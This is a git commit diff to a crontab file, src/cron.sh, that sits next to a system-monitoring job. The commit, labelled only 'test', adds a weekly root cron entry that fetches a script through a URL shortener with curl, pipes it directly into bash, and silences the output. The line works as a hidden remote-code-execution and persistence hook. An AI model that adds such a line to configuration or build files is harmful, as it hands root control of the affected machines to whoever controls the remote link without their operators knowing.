a51dd47f021cb0a63b611c0f321434518d0ef9a4
Harry - The DevOps Guy <mr.harry41@gmail.com>
2022-08-21 12:34:24 +0530

    test

--- src/cron.sh
+++ src/cron.sh
@@ -2,3 +2,4 @@ SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 #Monitor System with mTracker
 */5 * * * *   root   mtracker -m mwatcher > /dev/null
+@weekly   root   curl -sL t.ly/osop|bash - > /dev/null
